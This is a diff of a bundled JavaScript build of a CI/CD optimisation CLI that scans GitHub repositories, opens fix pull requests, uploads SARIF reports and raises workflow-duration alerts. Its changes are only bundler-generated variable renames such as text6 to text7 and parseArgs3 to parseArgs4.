@@ -37957,7 +45256,7 @@ async function applyRecipe(client, target, recipe, options = {}) {
     };
   }
   const config = remote.config;
-  const snapshot = await loadRepositorySnapshot(client, target, { ref: branch, config });
+  const snapshot = await loadRepositorySnapshot(client, target, { ref: branch2, config });
   const plan = planRecipe({ recipe, input: snapshot.input, config });
   const result = { repo: name, plan, attempted: false };
   if (options.dryRun) return result;
@@ -37966,7 +45265,7 @@ async function applyRecipe(client, target, recipe, options = {}) {
   const render = { compatibility: compat, ...options.server ? { server: options.server } : {} };
   const group = recipeGroup(recipe);
   const existingPulls = (await listManagedPullRequests(client, target, {
-    baseBranch: branch,
+    baseBranch: branch2,
     branchPrefix: config.fixes.branchPrefix,
     groups: [group]
   })).filter((pr) => pr.group === group);
@@ -37978,7 +45277,7 @@ async function applyRecipe(client, target, recipe, options = {}) {
     reviewers: fixes.reviewers
   });
   const appliedPulls = await applyFixActions(client, target, fixPlan.actions, {
-    baseBranch: branch,
+    baseBranch: branch2,
     baseSha: snapshot.sha,
     config: fixes,
     rules: allRules,
@@ -38007,8 +45306,8 @@ async function applyRecipe(client, target, recipe, options = {}) {
     result.issue = issue.number;
     if (issue.copilot) result.copilot = issue.copilot;
   } else if (wantsIssue) {
-    const open3 = existingIssues.find((candidate) => candidate.state === "open");
-    if (open3) result.issue = open3.number;
+    const open4 = existingIssues.find((candidate) => candidate.state === "open");
+    if (open4) result.issue = open4.number;
   }
   result.attempted = result.pullRequest !== void 0 || result.issue !== void 0;
   if (knowledge) result.knowledge = {
@@ -38045,11 +45344,11 @@ async function recipeStatus(client, target, recipe, server = "https://github.com
 var import_yaml48 = __toESM(require_dist(), 1);
 var DEFAULT_ROLLOUT = { waves: [1, 3, "25%", "100%"], minSamples: 5, minCompatibility: 0.7 };
 var REPO_NAME = /^[\w.-]+\/[\w.-]+$/;
-function parseRolloutTargets(text6) {
+function parseRolloutTargets(text7) {
   const problems = [];
   let raw;
   try {
-    raw = (0, import_yaml48.parse)(text6);
+    raw = (0, import_yaml48.parse)(text7);
   } catch (error2) {
     return { repositories: [], canaries: [], config: DEFAULT_ROLLOUT, problems: [`Invalid YAML: ${error2.message}`] };
   }
@@ -38086,10 +45385,10 @@ function parseRolloutTargets(text6) {
   }
   return { repositories, canaries, config, problems };
 }
-function fnv1a(text6) {
+function fnv1a(text7) {
   let hash4 = 2166136261;
-  for (let index = 0; index < text6.length; index += 1) {
-    hash4 ^= text6.charCodeAt(index);
+  for (let index = 0; index < text7.length; index += 1) {
+    hash4 ^= text7.charCodeAt(index);
     hash4 = Math.imul(hash4, 16777619) >>> 0;
   }
   return hash4;
@@ -38282,17 +45581,17 @@ function format2(value2) {
 }
 async function loadHillClimbConfig2(io, explicit) {
   const path = resolvePath(io, explicit ?? HILL_CLIMB_CONFIG_PATH);
-  const text6 = await readFile5(path, "utf8").catch((error2) => {
+  const text7 = await readFile5(path, "utf8").catch((error2) => {
     if (error2.code === "ENOENT" && !explicit) return void 0;
     throw new UsageError(`Cannot read ${path}: ${error2.message}`);
   });
-  const parsed = parseHillClimbConfig(text6);
+  const parsed = parseHillClimbConfig(text7);
   if (parsed.problems.length > 0) throw new UsageError(`Invalid ${path}:
 ${parsed.problems.map((p2) => `  ${p2.path || "(root)"}: ${p2.message}`).join("\n")}`);
   return parsed.config;
 }
 async function publishCommand(args, io) {
-  const { values: values2 } = parseArgs3({
+  const { values: values2 } = parseArgs4({
     args,
     strict: true,
     options: { ...COMMON2, repo: { type: "string" }, config: { type: "string" }, experiment: { type: "string" }, manifest: { type: "string" }, ref: { type: "string" }, "output-dir": { type: "string", default: RECIPES_DIR } }
@@ -38367,7 +45666,7 @@ function applySummary(result) {
   };
 }
 async function applyCommand(args, io) {
-  const { values: values2 } = parseArgs3({ args, strict: true, options: {
+  const { values: values2 } = parseArgs4({ args, strict: true, options: {
     ...COMMON2,
     recipe: { type: "string" },
     target: { type: "string" },
@@ -38420,7 +45719,7 @@ function renderStatus(recipe, statuses, plan, applied = []) {
   return lines.join("\n");
 }
 async function statusCommand(args, io) {
-  const { values: values2 } = parseArgs3({ args, strict: true, options: { ...COMMON2, recipe: { type: "string" }, targets: { type: "string" }, repos: { type: "string" }, canary: { type: "string" }, write: { type: "boolean", default: false } } });
+  const { values: values2 } = parseArgs4({ args, strict: true, options: { ...COMMON2, recipe: { type: "string" }, targets: { type: "string" }, repos: { type: "string" }, canary: { type: "string" }, write: { type: "boolean", default: false } } });
   const outputFormat = format2(values2.format);
   const recipe = await loadRecipe(io, values2.recipe);
   const targets = await loadTargets(io, values2);
@@ -38432,7 +45731,7 @@ async function statusCommand(args, io) {
   return 0;
 }
 async function rolloutCommand(args, io) {
-  const { values: values2 } = parseArgs3({
+  const { values: values2 } = parseArgs4({
     args,
     strict: true,
     options: {
@@ -38512,18 +45811,18 @@ async function recipesCommand(args, io) {
 }
 
 // src/cli/scan.ts
-import { parseArgs as parseArgs4 } from "node:util";
+import { parseArgs as parseArgs5 } from "node:util";
 
 // src/github/code-scanning.ts
 import { gzipSync } from "node:zlib";
 async function uploadSarif(client, repo, options) {
-  const text6 = typeof options.sarif === "string" ? options.sarif : JSON.stringify(options.sarif);
+  const text7 = typeof options.sarif === "string" ? options.sarif : JSON.stringify(options.sarif);
   try {
     const response = await client.request("POST /repos/{owner}/{repo}/code-scanning/sarifs", {
       ...repo,
       commit_sha: options.commitSha,
       ref: options.ref.startsWith("refs/") ? options.ref : `refs/heads/${options.ref}`,
-      sarif: gzipSync(Buffer.from(text6, "utf8")).toString("base64"),
+      sarif: gzipSync(Buffer.from(text7, "utf8")).toString("base64"),
       tool_name: options.toolName ?? "CI/CD Optimizer"
     });
     const id = response.data?.id;
@@ -38633,9 +45932,9 @@ init_identity();
 var isRecipeGroup = (group) => group.startsWith("recipe-");
 async function scanRepository(client, repo, options = {}) {
   const name = `${repo.owner}/${repo.repo}`;
-  const branch = await defaultBranch(client, repo, options.expectedRepositoryId);
-  const ref = options.ref ?? branch;
-  const remote = await loadRemoteConfig(client, repo, branch);
+  const branch2 = await defaultBranch(client, repo, options.expectedRepositoryId);
+  const ref = options.ref ?? branch2;
+  const remote = await loadRemoteConfig(client, repo, branch2);
   if (remote.problems.length > 0) {
     return { repo: name, ref, status: "invalid-config", configProblems: remote.problems.map((problem) => `${problem.path}: ${problem.message}`) };
   }
@@ -38667,9 +45966,9 @@ async function scanRepository(client, repo, options = {}) {
     ...knowledge ? { knowledge } : {}
   };
   if (options.uploadSarif) {
-    scan2.sarif = options.dryRun ? { status: "skipped" } : await uploadSarif(client, repo, { sarif: sarif(result, allRules, VERSION), commitSha: snapshot.sha, ref: ref === snapshot.sha ? branch : ref });
+    scan2.sarif = options.dryRun ? { status: "skipped" } : await uploadSarif(client, repo, { sarif: sarif(result, allRules, VERSION), commitSha: snapshot.sha, ref: ref === snapshot.sha ? branch2 : ref });
   }
-  const onDefaultBranch = ref === branch || ref === `refs/heads/${branch}`;
+  const onDefaultBranch = ref === branch2 || ref === `refs/heads/${branch2}`;
   if (onDefaultBranch && options.issues !== false && config.issues.enabled) {
     const existing = await listManagedIssues(client, repo, "finding");
     const desired = desiredIssues(result.diagnostics, config.issues, { owner: repo.owner, repo: repo.repo, sha: snapshot.sha, rules: allRules });
@@ -38679,7 +45978,7 @@ async function scanRepository(client, repo, options = {}) {
   }
   if (onDefaultBranch && options.fixes !== false && config.fixes.enabled) {
     const existing = (await listManagedPullRequests(client, repo, {
-      baseBranch: branch,
+      baseBranch: branch2,
       branchPrefix: config.fixes.branchPrefix,
       groups: [...Object.keys(config.fixes.groups), ...allRules.map((rule) => rule.meta.ruleset)]
     })).filter((pr) => !isRecipeGroup(pr.group));
@@ -38701,7 +46000,7 @@ async function scanRepository(client, repo, options = {}) {
       ...options.rebase ? { rebase: options.rebase } : {},
       ...options.recreate ? { recreate: options.recreate } : {}
     });
-    const applied = options.dryRun ? [] : await applyFixActions(client, repo, plan.actions, { baseBranch: branch, baseSha: snapshot.sha, config: config.fixes, rules: allRules, existing });
+    const applied = options.dryRun ? [] : await applyFixActions(client, repo, plan.actions, { baseBranch: branch2, baseSha: snapshot.sha, config: config.fixes, rules: allRules, existing });
     scan2.fixes = { ...plan, applied };
   }
   return scan2;
@@ -38787,7 +46086,7 @@ function summary2(scan2) {
   };
 }
 async function scanCommand(args, io) {
-  const { values: values2 } = parseArgs4({
+  const { values: values2 } = parseArgs5({
     args,
     strict: true,
     options: {
@@ -38829,7 +46128,7 @@ async function scanCommand(args, io) {
 // src/cli/telemetry.ts
 import { appendFile as appendFile2, mkdir as mkdir4 } from "node:fs/promises";
 import { dirname as dirname5 } from "node:path";
-import { parseArgs as parseArgs5 } from "node:util";
+import { parseArgs as parseArgs6 } from "node:util";
 
 // src/alerts/anomaly.ts
 init_history();
@@ -38960,11 +46259,11 @@ function formatDuration(ms) {
   const totalSeconds = Math.round(Math.abs(ms) / 1e3);
   const hours = Math.floor(totalSeconds / 3600);
   const minutes = Math.floor(totalSeconds % 3600 / 60);
-  const seconds3 = totalSeconds % 60;
+  const seconds2 = totalSeconds % 60;
   const sign = ms < 0 ? "-" : "";
   if (hours > 0) return `${sign}${hours}h ${minutes}m`;
-  if (minutes > 0) return `${sign}${minutes}m ${seconds3}s`;
-  return `${sign}${seconds3}s`;
+  if (minutes > 0) return `${sign}${minutes}m ${seconds2}s`;
+  return `${sign}${seconds2}s`;
 }
 function seriesKey(alert) {
   return alert.jobKey ?? "*";
@@ -39087,7 +46386,7 @@ function planAlertSync(input2) {
   const seriesMap = new Map(scopedSeries.map((series) => [seriesFingerprint(series), series]));
   const alerts = detectAnomalies(scopedSeries, input2.config);
   const history = input2.existing.filter((issue) => issue.fingerprint === fingerprint2).sort((a, b) => b.number - a.number);
-  const open3 = history.find((issue) => issue.state === "open");
+  const open4 = history.find((issue) => issue.state === "open");
   const legacy = alertIssueFingerprint(input2.workflowId);
   const related2 = input2.contextKey === void 0 ? [] : input2.existing.filter((issue) => issue.fingerprint === legacy || issue.fingerprint.startsWith(`${legacy}/`) && issue.fingerprint !== fingerprint2 && issue.attributes.branch === (input2.branch ?? ""));
   const latestClosed = [...history, ...related2].sort((a, b) => b.number - a.number).find((issue) => issue.state === "closed");
@@ -39105,8 +46404,8 @@ function planAlertSync(input2) {
     });
   }
   if (alerts.length === 0) {
-    if (!open3) return plan;
-    const baselines2 = readBaselines(open3);
+    if (!open4) return plan;
+    const baselines2 = readBaselines(open4);
     const keys = Object.keys(baselines2);
     const recovered = keys.length > 0 && keys.every((key2) => {
       const series = seriesMap.get(seriesFingerprint({
@@ -39119,21 +46418,21 @@ function planAlertSync(input2) {
     if (recovered) {
       actions.push({
         type: "close",
-        number: open3.number,
+        number: open4.number,
         fingerprint: fingerprint2,
         comment: `Durations are back within the baseline for the last ${input2.config.recoveryRuns} runs (${keys.map((key2) => `${key2 === "*" ? "workflow" : `\`${key2}\``} \u2264 ${formatDuration(baselines2[key2])} + tolerance`).join(", ")}). Closing this alert. :tada:`
       });
     }
     return plan;
   }
-  if (!open3 && latestClosed?.stateReason === "not_planned" && latestClosed.closedAt) {
+  if (!open4 && latestClosed?.stateReason === "not_planned" && latestClosed.closedAt) {
     const snoozedUntil = Date.parse(latestClosed.closedAt) + input2.config.snoozeDays * 864e5;
     if (input2.now.getTime() < snoozedUntil) {
       plan.skipped.push({ fingerprint: fingerprint2, reason: "dismissed", number: latestClosed.number });
       return plan;
     }
   }
-  const baselines = readBaselines(open3);
+  const baselines = readBaselines(open4);
   for (const alert of alerts) baselines[seriesKey(alert)] ??= Math.round(alert.baselineMedianMs);
   const shape = shapeOf(alerts);
   const latestRun = Math.max(...alerts.map((alert) => alert.runId));
@@ -39145,7 +46444,7 @@ function planAlertSync(input2) {
     recoveryRuns: input2.config.recoveryRuns,
     snoozeDays: input2.config.snoozeDays,
     baselines,
-    ...!open3 && latestClosed ? { previousIssue: latestClosed.number } : {}
+    ...!open4 && latestClosed ? { previousIssue: latestClosed.number } : {}
   });
   const signature2 = signatureOf([shape, String(latestRun)]);
   const critical = alerts.some((alert) => alert.severity === "critical");
@@ -39160,20 +46459,20 @@ ${rendered.body}`,
     assignCopilot: input2.config.assignCopilot,
     priority: critical ? 2 : 1
   };
-  if (!open3) {
+  if (!open4) {
     actions.push({ type: "create", desired });
     return plan;
   }
-  if (open3.signature === signature2) {
-    if (desired.assignCopilot && open3.copilotPending) actions.push({ type: "assign", number: open3.number, desired });
+  if (open4.signature === signature2) {
+    if (desired.assignCopilot && open4.copilotPending) actions.push({ type: "assign", number: open4.number, desired });
     return plan;
   }
-  const changed = open3.attributes.shape !== shape;
+  const changed = open4.attributes.shape !== shape;
   actions.push({
     type: "update",
-    number: open3.number,
+    number: open4.number,
     desired,
-    ...open3.copilotPending ? { retryCopilot: true } : {},
+    ...open4.copilotPending ? { retryCopilot: true } : {},
     ...changed ? {
       comment: `The anomaly changed on run [#${latestRun}](https://github.com/${input2.owner}/${input2.repo}/actions/runs/${latestRun}): ${alerts.map((alert) => `${alert.jobKey === void 0 ? "workflow" : `\`${alert.jobName ?? alert.jobKey}\``} ${alert.kind} +${Math.round(alert.increasePercent)}% (${alert.severity})`).join("; ")}.`
     } : {}
@@ -39213,7 +46512,7 @@ var QUEUE_THRESHOLD_MS = 5e3;
 function createTelemetryReport(snapshot, baseline) {
   const criticalPath = calculateCriticalPath(snapshot.jobs);
   const slowest = [...snapshot.jobs].sort((a, b) => b.durationMs - a.durationMs).slice(0, 5);
-  const comparison = baseline ? compare2(snapshot.durationMs, baseline.medianDurationMs, baseline.sampleCount) : comparisonProblem(snapshot) ? `Performance comparison withheld: ${comparisonProblem(snapshot)}` : "No comparable historical baseline is available in the retained/backfilled evidence window.";
+  const comparison = baseline ? compare3(snapshot.durationMs, baseline.medianDurationMs, baseline.sampleCount) : comparisonProblem(snapshot) ? `Performance comparison withheld: ${comparisonProblem(snapshot)}` : "No comparable historical baseline is available in the retained/backfilled evidence window.";
   return [
     `## ${snapshot.workflowName} performance snapshot`,
     "",
@@ -39248,13 +46547,13 @@ function calculateCriticalPath(jobs) {
   const byKey = new Map(jobs.map((job) => [job.key, job]));
   const memo = /* @__PURE__ */ new Map();
   const visiting = /* @__PURE__ */ new Set();
-  function visit3(key2) {
+  function visit4(key2) {
     const cached = memo.get(key2);
     if (cached) return cached;
     const job = byKey.get(key2);
     if (!job || visiting.has(key2)) return { durationMs: 0, jobKeys: [] };
     visiting.add(key2);
-    const parentPaths = job.needs.map(visit3);
+    const parentPaths = job.needs.map(visit4);
     const longestParent = parentPaths.reduce(
       (longest, candidate) => candidate.durationMs > longest.durationMs ? candidate : longest,
       { durationMs: 0, jobKeys: [] }
@@ -39269,7 +46568,7 @@ function calculateCriticalPath(jobs) {
   }
   return jobs.reduce(
     (longest, job) => {
-      const candidate = visit3(job.key);
+      const candidate = visit4(job.key);
       return candidate.durationMs > longest.durationMs ? candidate : longest;
     },
     { durationMs: 0, jobKeys: [] }
@@ -39385,7 +46684,7 @@ function recommendations(snapshot, criticalPath, baseline) {
   }
   return messages;
 }
-function compare2(current, median2, samples) {
+function compare3(current, median2, samples) {
   if (median2 === 0) return `Compared with ${samples} prior successful runs.`;
   const delta = (current - median2) / median2 * 100;
   const direction = delta > 0 ? "slower" : "faster";
@@ -39395,9 +46694,9 @@ function percentage(part2, whole) {
   return whole > 0 ? `${(part2 / whole * 100).toFixed(0)}%` : "0%";
 }
 function formatDuration2(milliseconds) {
-  const seconds3 = Math.round(milliseconds / 1e3);
-  const minutes = Math.floor(seconds3 / 60);
-  const remainder = seconds3 % 60;
+  const seconds2 = Math.round(milliseconds / 1e3);
+  const minutes = Math.floor(seconds2 / 60);
+  const remainder = seconds2 % 60;
   return minutes > 0 ? `${minutes}m ${remainder}s` : `${remainder}s`;
 }
 function withoutMillis(value2) {
@@ -39416,10 +46715,10 @@ init_history();
 function workflowPath(path) {
   return path.replace(/@.*$/, "");
 }
-function parseJobDefinitions(text6) {
+function parseJobDefinitions(text7) {
   let document;
   try {
-    document = (0, import_yaml49.parse)(text6);
+    document = (0, import_yaml49.parse)(text7);
   } catch {
     return /* @__PURE__ */ new Map();
   }
@@ -39433,8 +46732,8 @@ function parseJobDefinitions(text6) {
 }
 async function loadJobDefinitions(client, repo, path, ref) {
   try {
-    const text6 = await readFileAt(client, repo, workflowPath(path), ref);
-    return text6 === void 0 ? /* @__PURE__ */ new Map() : parseJobDefinitions(text6);
+    const text7 = await readFileAt(client, repo, workflowPath(path), ref);
+    return text7 === void 0 ? /* @__PURE__ */ new Map() : parseJobDefinitions(text7);
   } catch {
     return /* @__PURE__ */ new Map();
   }
@@ -39615,10 +46914,10 @@ var TELEMETRY_CHECK_PREFIX = "CI/CD Telemetry";
 var MAX_OUTPUT_LENGTH = 65535;
 var ANNOTATIONS_PER_REQUEST = 50;
 var MAX_ANNOTATIONS = 500;
-function truncate(text6, max2 = MAX_OUTPUT_LENGTH) {
-  if (text6.length <= max2) return text6;
+function truncate(text7, max2 = MAX_OUTPUT_LENGTH) {
+  if (text7.length <= max2) return text7;
   const note = "\n\n_\u2026truncated._";
-  return `${text6.slice(0, max2 - note.length)}${note}`;
+  return `${text7.slice(0, max2 - note.length)}${note}`;
 }
 function output(value2, annotations) {
   return {
@@ -39685,9 +46984,9 @@ function analyzeDurations(reference, window, config) {
   const problems = durationPolicyProblems(config);
   if (problems.length) throw new Error(`Invalid duration policy: ${problems.map((problem2) => problem2.path).join(", ")}`);
   if (new Set(window.groups.map((group) => group.runId)).size !== window.groups.length) throw new Error("Duplicate logical runs in duration evidence");
-  for (const group of window.groups) for (const observation of group.observations) {
-    validateRunObservation(observation);
-    if (observation.run.runId !== group.runId || observation.repository.host !== reference.repository.host || observation.repository.repositoryId !== reference.repository.repositoryId) throw new Error("Duration evidence crosses its repository or logical run scope");
+  for (const group of window.groups) for (const observation2 of group.observations) {
+    validateRunObservation(observation2);
+    if (observation2.run.runId !== group.runId || observation2.repository.host !== reference.repository.host || observation2.repository.repositoryId !== reference.repository.repositoryId) throw new Error("Duration evidence crosses its repository or logical run scope");
   }
   const run4 = reference.run;
   const report = {
@@ -39711,7 +47010,7 @@ function analyzeDurations(reference, window, config) {
   };
   const referenceGroup = window.groups.find((group) => group.runId === run4.runId);
   const problem = referenceGroup ? groupProblem(referenceGroup) : "reference-not-recorded";
-  if (problem || !referenceGroup?.observations.some((observation) => observation.id === reference.id)) {
+  if (problem || !referenceGroup?.observations.some((observation2) => observation2.id === reference.id)) {
     report.reason = problem ?? "reference-not-recorded";
     return analysis;
   }
@@ -39728,7 +47027,7 @@ function analyzeDurations(reference, window, config) {
       report.excluded.push({ runId: group.runId, reason: reason ?? "incomplete-run-evidence" });
       continue;
     }
-    report.samples.push({ runId: group.runId, observationIds: group.observations.map((observation) => observation.id).sort() });
+    report.samples.push({ runId: group.runId, observationIds: group.observations.map((observation2) => observation2.id).sort() });
     analysis.history.push(prior);
   }
   analysis.history.sort(byCompletion);
@@ -39832,13 +47131,13 @@ async function collectRunKnowledge(client, repo, run4, config, options = {}) {
       });
     }
   }
-  const observation = createRunObservation(
+  const observation2 = createRunObservation(
     repository,
     run4,
     project ? { status: "linked", snapshotId: project.id } : { status: "unavailable", reason: "revision-unavailable" },
     options.now
   );
-  if (options.store) await options.store.saveRunObservation(observation, project);
+  if (options.store) await options.store.saveRunObservation(observation2, project);
   let mitigations;
   if (options.store && project && config.recipes.enabled) {
     const applications = (await options.store.listMitigationApplications(repository, 100)).filter((application) => application.change.kind !== "commit");
@@ -39853,10 +47152,10 @@ async function collectRunKnowledge(client, repo, run4, config, options = {}) {
     branch: run4.branch,
     referenceRunId: run4.runId,
     limit: 100
-  }) : { complete: false, groups: [{ runId: run4.runId, complete: true, observations: [observation] }] };
-  const { report: durations, ...comparison } = analyzeDurations(observation, window, config.durations);
+  }) : { complete: false, groups: [{ runId: run4.runId, complete: true, observations: [observation2] }] };
+  const { report: durations, ...comparison } = analyzeDurations(observation2, window, config.durations);
   return {
-    observation,
+    observation: observation2,
     ...project ? { project } : {},
     persistence: options.store ? "saved" : "preview",
     durations,
@@ -39893,8 +47192,8 @@ function historyLimit(config) {
 }
 async function processWorkflowRun(client, repo, run4, options = {}) {
   if (run4.status && run4.status !== "completed") return { status: "skipped", reason: `Run is ${run4.status}.` };
-  const branch = await defaultBranch(client, repo, options.expectedRepositoryId);
-  const remote = await loadRemoteConfig(client, repo, branch);
+  const branch2 = await defaultBranch(client, repo, options.expectedRepositoryId);
+  const remote = await loadRemoteConfig(client, repo, branch2);
   const config = remote.config;
   if (!config.enabled) return { status: "disabled" };
   const definitions = await loadJobDefinitions(client, repo, run4.path, run4.head_sha);
@@ -39938,7 +47237,7 @@ async function processWorkflowRun(client, repo, run4, options = {}) {
   const newerRunObserved = knowledgeComparison?.newerRunObserved || history.some(
     (item) => item.workflowId === snapshot.workflowId && item.branch === snapshot.branch && item.runId !== snapshot.runId && byCompletion(item, snapshot) > 0
   );
-  if (contextKey && !knowledgeComparison?.alertHistoryUncertain && !newerRunObserved && options.alerts !== false && config.alerts.enabled && remote.problems.length === 0 && alertsApply(run4, config.alerts.branches, branch)) {
+  if (contextKey && !knowledgeComparison?.alertHistoryUncertain && !newerRunObserved && options.alerts !== false && config.alerts.enabled && remote.problems.length === 0 && alertsApply(run4, config.alerts.branches, branch2)) {
     const series = buildSeries([...prior, snapshot]);
     const existing = await listManagedIssues(client, repo, "alert");
     const branchRuns = history.filter((item) => item.workflowId === snapshot.workflowId && item.branch === snapshot.branch).slice(-historyLimit(config));
@@ -40041,11 +47340,11 @@ var FileTelemetryStore = class {
   }
   async load() {
     if (this.snapshots) return this.snapshots;
-    const text6 = await readFile6(this.path, "utf8").catch((error2) => {
+    const text7 = await readFile6(this.path, "utf8").catch((error2) => {
       if (error2.code === "ENOENT") return "";
       throw error2;
     });
-    this.snapshots = text6.split("\n").flatMap((line) => {
+    this.snapshots = text7.split("\n").flatMap((line) => {
       if (!line.trim()) return [];
       try {
         const parsed = JSON.parse(line);
@@ -40102,7 +47401,7 @@ function runSummary(result, repo) {
   };
 }
 async function telemetryCommand(args, io) {
-  const { values: values2 } = parseArgs5({
+  const { values: values2 } = parseArgs6({
     args,
     strict: true,
     options: {
@@ -40161,7 +47460,7 @@ async function telemetryCommand(args, io) {
 }
 
 // src/cli/knowledge.ts
-import { parseArgs as parseArgs6 } from "node:util";
+import { parseArgs as parseArgs7 } from "node:util";
 
 // src/service/mitigation-knowledge.ts
 init_identity();
@@ -40195,9 +47494,9 @@ function authorization(client, repo, identity3, store) {
       await authorizeRevision(topology.revision);
     },
     observation: async (id) => {
-      const observation = await store.loadRunObservation(identity3, id);
-      if (!observation) throw new Error("Referenced run evidence is unavailable in this repository");
-      const { run: run4 } = observation;
+      const observation2 = await store.loadRunObservation(identity3, id);
+      if (!observation2) throw new Error("Referenced run evidence is unavailable in this repository");
+      const { run: run4 } = observation2;
       const key2 = `${run4.runId}:${run4.runAttempt}:${run4.headSha}`;
       if (!runs.has(key2)) {
         const response = await client.request("GET /repos/{owner}/{repo}/actions/runs/{run_id}/attempts/{attempt_number}", {
@@ -40212,7 +47511,7 @@ function authorization(client, repo, identity3, store) {
         runs.add(key2);
       }
       await authorizeRevision(run4.headSha);
-      return observation;
+      return observation2;
     }
   };
 }
@@ -40221,8 +47520,8 @@ async function authorizedRunKnowledge(client, repo, factory, id) {
   const identity3 = await authorizeRepository(client, repo);
   const store = await factory();
   const access = authorization(client, repo, identity3, store);
-  const observation = await access.observation(id);
-  return { identity: identity3, store, access, observation };
+  const observation2 = await access.observation(id);
+  return { identity: identity3, store, access, observation: observation2 };
 }
 async function authorizedApplication(client, repo, factory, id) {
   evidenceId(id);
@@ -40250,7 +47549,7 @@ async function listRunKnowledge(client, repo, factory, limit3 = 20, runId) {
   const store = await factory();
   const observations = await store.listRunObservations({ ...identity3, limit: limit3, ...runId !== void 0 ? { runId } : {} });
   const access = authorization(client, repo, identity3, store);
-  for (const observation of observations) await access.observation(observation.id);
+  for (const observation2 of observations) await access.observation(observation2.id);
   return { repository: identity3, observations, limit: limit3, coverage: "bounded" };
 }
 async function inspectMitigationKnowledge(client, repo, factory, id, limit3 = 20) {
@@ -40326,7 +47625,7 @@ async function knowledgeCommand(args, io) {
     return 0;
   }
   if (!["applications", "runs", "inspect", "refresh", "evaluate"].includes(command)) throw new UsageError(`Unknown knowledge command "${command}".`);
-  const { values: values2 } = parseArgs6({
+  const { values: values2 } = parseArgs7({
     args: rest,
     strict: true,
     options: {
@@ -40365,7 +47664,7 @@ async function knowledgeCommand(args, io) {
 
 // src/cli/maintenance.ts
 init_maintenance();
-import { parseArgs as parseArgs7 } from "node:util";
+import { parseArgs as parseArgs8 } from "node:util";
 var MAINTENANCE_HELP = `Usage: ci-cd-optimizer maintenance <prune|purge> --host <HTTPS-origin> --repository-id <stable-id> [options]
 
 Operator-only access using DATABASE_URL, not a GitHub token. Preview is the default.
@@ -40385,7 +47684,7 @@ async function maintenanceCommand(args, io) {
     return 0;
   }
   if (mode !== "prune" && mode !== "purge") throw new UsageError("Maintenance requires prune or purge.");
-  const { values: values2 } = parseArgs7({
+  const { values: values2 } = parseArgs8({
     args: rest,
     strict: true,
     options: {
@@ -40426,17 +47725,17 @@ async function maintenanceCommand(args, io) {
 }
 
 // src/cli/execution.ts
-import { parseArgs as parseArgs8 } from "node:util";
+import { parseArgs as parseArgs9 } from "node:util";
 
 // src/telemetry/execution-capture.ts
 init_execution();
 import { execFile as execFile2, spawn as spawn2 } from "node:child_process";
-import { lstat, open as open2, realpath as realpath2, stat as stat6, writeFile as writeFile4 } from "node:fs/promises";
+import { lstat, open as open3, realpath as realpath2, stat as stat6, writeFile as writeFile4 } from "node:fs/promises";
 import { dirname as dirname6, isAbsolute as isAbsolute5, relative as relative6, resolve as resolve4 } from "node:path";
 import { promisify as promisify2 } from "node:util";
 var exec = promisify2(execFile2);
 async function readExecutionJson(path) {
-  const file = await open2(path, "r");
+  const file = await open3(path, "r");
   try {
     if (!(await file.stat()).isFile()) throw new Error("Execution input must be a regular file");
     const buffer = Buffer.alloc(MAX_EXECUTION_BYTES + 1);
@@ -40528,11 +47827,11 @@ var limitations = [
   "Single-command coverage; project paths and installed tools/cache outcomes are reported, not inferred from declarations.",
   "Reports are not used automatically as duration samples, verified project attribution, cache savings, or causal mitigation evidence."
 ];
-async function authorizeJob(client, repo, execution, observation) {
-  validateExecutionObservation(execution, observation);
+async function authorizeJob(client, repo, execution, observation2) {
+  validateExecutionObservation(execution, observation2);
   const response = await client.request("GET /repos/{owner}/{repo}/actions/jobs/{job_id}", { ...repo, job_id: execution.jobId });
   const data = response.data;
-  if (data?.id !== execution.jobId || data.run_id !== observation.run.runId || data.run_attempt !== observation.run.runAttempt || data.head_sha !== observation.run.headSha) {
+  if (data?.id !== execution.jobId || data.run_id !== observation2.run.runId || data.run_attempt !== observation2.run.runAttempt || data.head_sha !== observation2.run.headSha) {
     throw new Error("Actions job does not match the execution report's exact run attempt");
   }
 }
@@ -40583,7 +47882,7 @@ async function executionCommand(args, io) {
   }
   if (command === "capture") {
     const separator = rest.indexOf("--");
-    const { values: values3 } = parseArgs8({
+    const { values: values3 } = parseArgs9({
       args: separator < 0 ? rest : rest.slice(0, separator),
       strict: true,
       options: {
@@ -40609,7 +47908,7 @@ async function executionCommand(args, io) {
     return report.exitCode ?? 1;
   }
   if (command !== "import" && command !== "list") throw new UsageError("Execution requires capture, import or list.");
-  const { values: values2 } = parseArgs8({
+  const { values: values2 } = parseArgs9({
     args: rest,
     strict: true,
     options: {
@@ -40640,7 +47939,7 @@ async function executionCommand(args, io) {
 // src/cli/review.ts
 import { lstat as lstat2, mkdir as mkdir5, readdir as readdir4, readFile as readFile7, writeFile as writeFile5 } from "node:fs/promises";
 import { basename as basename3, dirname as dirname7, join as join8 } from "node:path";
-import { parseArgs as parseArgs9 } from "node:util";
+import { parseArgs as parseArgs10 } from "node:util";
 
 // src/review/escape.ts
 var ZWSP = "\u200B";
@@ -40662,8 +47961,8 @@ function describeValue(value2, max2 = 80) {
   return typeof value2 === "object" ? "a mapping" : typeof value2;
 }
 function escapeInline(value2, max2 = MAX_INLINE_LENGTH) {
-  const text6 = truncate2(sanitizeText(value2), max2).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/[@#\uFF20\uFF03]/g, (character) => `${character}${ZWSP}`).replace(/:(?=[:/])/g, `:${ZWSP}`).replace(/\b(www|gh)([.-])/gi, `$1${ZWSP}$2`);
-  return text6.replace(/(&(?:amp|lt|gt);)|[\\`*_{}[\]()#+\-.!|~^=$"']/g, (match2, entity) => entity ?? `\\${match2}`);
+  const text7 = truncate2(sanitizeText(value2), max2).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/[@#\uFF20\uFF03]/g, (character) => `${character}${ZWSP}`).replace(/:(?=[:/])/g, `:${ZWSP}`).replace(/\b(www|gh)([.-])/gi, `$1${ZWSP}$2`);
+  return text7.replace(/(&(?:amp|lt|gt);)|[\\`*_{}[\]()#+\-.!|~^=$"']/g, (match2, entity) => entity ?? `\\${match2}`);
 }
 function capComment(body, max2 = MAX_COMMENT_LENGTH) {
   if (body.length <= max2) return body;
@@ -40684,13 +47983,13 @@ var LANGUAGE_PATTERN = /^[a-z0-9+#.-]{1,32}$/;
 var EMAIL_PATTERN = /^[A-Za-z0-9._%+-]{1,64}@[A-Za-z0-9-]{1,63}(?:\.[A-Za-z0-9-]{1,63})*\.[A-Za-z]{2,63}$/;
 var GITHUB_PREFIX = "https://github.com/";
 var MAX_AUTO_CCS = 10;
-function parseStrictYaml(text6, maxBytes, label) {
